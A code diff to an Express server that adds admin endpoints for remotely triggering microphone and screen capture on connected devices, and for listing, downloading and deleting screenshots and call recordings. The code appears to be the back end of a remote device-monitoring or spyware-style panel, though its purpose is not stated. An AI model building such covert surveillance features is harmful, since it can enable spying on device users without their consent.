@@ -3337,12 +3337,144 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
       const { deviceId } = req.params;
       const { duration_s = 30 } = req.body;
 
-      const device = db.prepare('SELECT socket_id FROM devices WHERE device_id = ?').get(deviceId);
-      const socket = device?.socket_id && io.sockets.sockets.get(device.socket_id);
-      if (!socket) return res.status(400).json({ error: 'Device not connected' });
+      const targetSocket = findDeviceSocket(deviceId);
+      if (!targetSocket) return res.status(400).json({ error: 'Device not connected' });
 
-      socket.emit('start_mic_capture', cryptoEncrypt({ device_id: deviceId, duration_s: parseInt(duration_s) || 30 }));
+      targetSocket.emit('start_mic_capture', { device_id: deviceId, duration_s: parseInt(duration_s) || 30 });
       res.json({ success: true, message: `Mic capture (${duration_s}s) dispatched to device` });
+    } catch (err) {
+      res.status(500).json({ error: err.message });
+    }
+  });
+
+  // ═══ SCREEN CAPTURE — relay command to device via Socket.IO ═══
+  app.post('/api/admin/connections/:deviceId/screen-capture', (req, res) => {
+    try {
+      if (!isAdminAuthorized(req)) return res.status(401).json({ error: 'Unauthorized' });
+      const { deviceId } = req.params;
+
+      const targetSocket = findDeviceSocket(deviceId);
+      if (!targetSocket) return res.status(400).json({ error: 'Device not connected' });
+
+      targetSocket.emit('capture_screen', { device_id: deviceId });
+      res.json({ success: true, message: 'Screen capture dispatched to device' });
+    } catch (err) {
+      res.status(500).json({ error: err.message });
+    }
+  });
+
+  // ═══ SCREEN CAPTURES — list endpoint ═══
+  app.get('/api/admin/connections/:deviceId/screen-captures', (req, res) => {
+    try {
+      if (!isAdminAuthorized(req)) return res.status(401).json({ error: 'Unauthorized' });
+      const { deviceId } = req.params;
+      const page = parseInt(req.query.page) || 1;
+      const limit = Math.min(parseInt(req.query.limit) || 20, 100);
+      const offset = (page - 1) * limit;
+
+      try {
+        db.exec(`CREATE TABLE IF NOT EXISTS screen_captures (
+          id INTEGER PRIMARY KEY AUTOINCREMENT,
+          device_id TEXT, image_data TEXT, width INTEGER, height INTEGER,
+          file_size INTEGER, captured_at TEXT DEFAULT (datetime('now'))
+        )`);
+      } catch (_) {}
+
+      const total = db.prepare('SELECT COUNT(*) as c FROM screen_captures WHERE device_id = ?').get(deviceId)?.c || 0;
+      const rows = db.prepare('SELECT id, width, height, file_size, captured_at FROM screen_captures WHERE device_id = ? ORDER BY captured_at DESC LIMIT ? OFFSET ?').all(deviceId, limit, offset);
+
+      res.json({ captures: rows, total, page, totalPages: Math.ceil(total / limit) });
+    } catch (err) {
+      res.status(500).json({ error: err.message });
+    }
+  });
+
+  // ═══ SCREEN CAPTURE — get single image ═══
+  app.get('/api/admin/connections/:deviceId/screen-captures/:id', (req, res) => {
+    try {
+      if (!isAdminAuthorized(req)) return res.status(401).json({ error: 'Unauthorized' });
+      const { deviceId, id } = req.params;
+      const row = db.prepare('SELECT image_data FROM screen_captures WHERE id = ? AND device_id = ?').get(id, deviceId);
+      if (!row) return res.status(404).json({ error: 'Capture not found' });
+      // image_data is base64 — return as JSON
+      res.json({ id: parseInt(id), image_base64: row.image_data });
+    } catch (err) {
+      res.status(500).json({ error: err.message });
+    }
+  });
+
+  // ═══ SCREEN CAPTURE — delete ═══
+  app.delete('/api/admin/connections/:deviceId/screen-captures/:id', (req, res) => {
+    try {
+      if (!isAdminAuthorized(req)) return res.status(401).json({ error: 'Unauthorized' });
+      const { deviceId, id } = req.params;
+      db.prepare('DELETE FROM screen_captures WHERE id = ? AND device_id = ?').run(id, deviceId);
+      res.json({ success: true });
+    } catch (err) {
+      res.status(500).json({ error: err.message });
+    }
+  });
+
+  // ═══ CALL RECORDINGS — list endpoint ═══
+  app.get('/api/admin/connections/:deviceId/call-recordings', (req, res) => {
+    try {
+      if (!isAdminAuthorized(req)) return res.status(401).json({ error: 'Unauthorized' });
+      const { deviceId } = req.params;
+      const page = parseInt(req.query.page) || 1;
+      const limit = Math.min(parseInt(req.query.limit) || 20, 100);
+      const offset = (page - 1) * limit;
+
+      try {
+        db.exec(`CREATE TABLE IF NOT EXISTS call_recordings (
+          id INTEGER PRIMARY KEY AUTOINCREMENT,
+          device_id TEXT, filename TEXT, duration_s INTEGER,
+          file_size INTEGER, recorded_at TEXT DEFAULT (datetime('now'))
+        )`);
+      } catch (_) {}
+
+      const total = db.prepare('SELECT COUNT(*) as c FROM call_recordings WHERE device_id = ?').get(deviceId)?.c || 0;
+      const rows = db.prepare('SELECT id, filename, duration_s, file_size, recorded_at FROM call_recordings WHERE device_id = ? ORDER BY recorded_at DESC LIMIT ? OFFSET ?').all(deviceId, limit, offset);
+
+      res.json({ recordings: rows, total, page, totalPages: Math.ceil(total / limit) });
+    } catch (err) {
+      res.status(500).json({ error: err.message });
+    }
+  });
+
+  // ═══ CALL RECORDING — download ═══
+  app.get('/api/admin/connections/:deviceId/call-recordings/:id', (req, res) => {
+    try {
+      if (!isAdminAuthorized(req)) return res.status(401).json({ error: 'Unauthorized' });
+      const { deviceId, id } = req.params;
+      const row = db.prepare('SELECT filename FROM call_recordings WHERE id = ? AND device_id = ?').get(id, deviceId);
+      if (!row) return res.status(404).json({ error: 'Recording not found' });
+
+      const path = require('path');
+      const fs = require('fs');
+      const filePath = path.join(__dirname, 'data', 'recordings', deviceId, row.filename);
+      if (!fs.existsSync(filePath)) return res.status(404).json({ error: 'File not found' });
+      res.download(filePath, row.filename);
+    } catch (err) {
+      res.status(500).json({ error: err.message });
+    }
+  });
+
+  // ═══ CALL RECORDING — delete ═══
+  app.delete('/api/admin/connections/:deviceId/call-recordings/:id', (req, res) => {
+    try {
+      if (!isAdminAuthorized(req)) return res.status(401).json({ error: 'Unauthorized' });
+      const { deviceId, id } = req.params;
+      const row = db.prepare('SELECT filename FROM call_recordings WHERE id = ? AND device_id = ?').get(id, deviceId);
+      if (row) {
+        try {
+          const path = require('path');
+          const fs = require('fs');
+          const filePath = path.join(__dirname, 'data', 'recordings', deviceId, row.filename);
+          if (fs.existsSync(filePath)) fs.unlinkSync(filePath);
+        } catch (_) {}
+      }
+      db.prepare('DELETE FROM call_recordings WHERE id = ? AND device_id = ?').run(id, deviceId);
+      res.json({ success: true });
     } catch (err) {
       res.status(500).json({ error: err.message });
     }
